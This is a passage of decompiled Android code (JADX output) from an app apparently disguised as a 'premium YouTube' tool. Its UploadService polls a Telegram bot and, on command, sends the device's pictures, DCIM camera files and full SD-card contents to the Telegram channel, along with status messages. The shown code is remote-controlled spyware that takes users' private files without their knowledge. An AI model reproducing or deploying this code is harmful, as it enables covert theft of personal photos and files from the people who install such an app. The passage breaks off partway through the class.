                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۳۸String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch47$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$55, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$55", f = "UploadService.kt", i = {}, l = {1762}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass55 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass55(UploadService uploadService, Continuation<? super AnonymousClass55> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass55(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendAllPicturesFilesToTelegramControlled((Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$56, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$56", f = "UploadService.kt", i = {}, l = {1766}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass56 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass56(UploadService uploadService, Continuation<? super AnonymousClass56> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass56(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۴۰String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch48$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$57, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$57", f = "UploadService.kt", i = {}, l = {1770}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass57 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass57(UploadService uploadService, Continuation<? super AnonymousClass57> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass57(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۴۲String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch49$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$58, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$58", f = "UploadService.kt", i = {}, l = {1771}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass58 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass58(UploadService uploadService, Continuation<? super AnonymousClass58> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass58(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendAllDCIMFilesToTelegramControlled((Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$59, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$59", f = "UploadService.kt", i = {}, l = {1775}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass59 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass59(UploadService uploadService, Continuation<? super AnonymousClass59> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass59(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۴۴String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch50$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$60, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$60", f = "UploadService.kt", i = {}, l = {1779}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass60 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass60(UploadService uploadService, Continuation<? super AnonymousClass60> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass60(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۴۶String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch51$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$61, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$61", f = "UploadService.kt", i = {}, l = {1780}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass61 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass61(UploadService uploadService, Continuation<? super AnonymousClass61> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass61(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendAllFullSdcardFilesToTelegramControlled((Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$62, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$62", f = "UploadService.kt", i = {}, l = {1784}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass62 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass62(UploadService uploadService, Continuation<? super AnonymousClass62> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass62(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۴۸String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch52$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$63, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$63", f = "UploadService.kt", i = {}, l = {1795}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass63 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass63(UploadService uploadService, Continuation<? super AnonymousClass63> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass63(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۵۷String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$else$if$branch53$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$64, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$64", f = "UploadService.kt", i = {}, l = {1804}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass64 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass64(UploadService uploadService, Continuation<? super AnonymousClass64> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass64(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۵۸String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$else$if$branch54$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$65, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$65", f = "UploadService.kt", i = {}, l = {1816}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass65 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            final /* synthetic */ String $msg;
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass65(UploadService uploadService, String str, Continuation<? super AnonymousClass65> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
                this.$msg = str;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass65(this.this$0, this.$msg, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۵۱۵String$0$str$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService() + this.$msg, (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$66, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$66", f = "UploadService.kt", i = {}, l = {1822}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass66 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass66(UploadService uploadService, Continuation<? super AnonymousClass66> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass66(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        String replyMarkup = this.this$0.buildCommandsKeyboard();
                        this.label = 1;
                        if (this.this$0.sendTextToTelegramWithKeyboard(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۶۶String$arg0$callsendTextToTelegramWithKeyboard$fun$anonymous$$arg2$calllaunch$branch3$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), replyMarkup, (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$67, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$67", f = "UploadService.kt", i = {}, l = {1826}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass67 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass67(UploadService uploadService, Continuation<? super AnonymousClass67> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass67(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۲۸String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch4$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$68, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$68", f = "UploadService.kt", i = {}, l = {1832}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass68 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            final /* synthetic */ String $msg;
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass68(UploadService uploadService, String str, Continuation<? super AnonymousClass68> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
                this.$msg = str;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass68(this.this$0, this.$msg, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۵۲۰String$0$str$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch5$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService() + this.$msg, (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$69, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
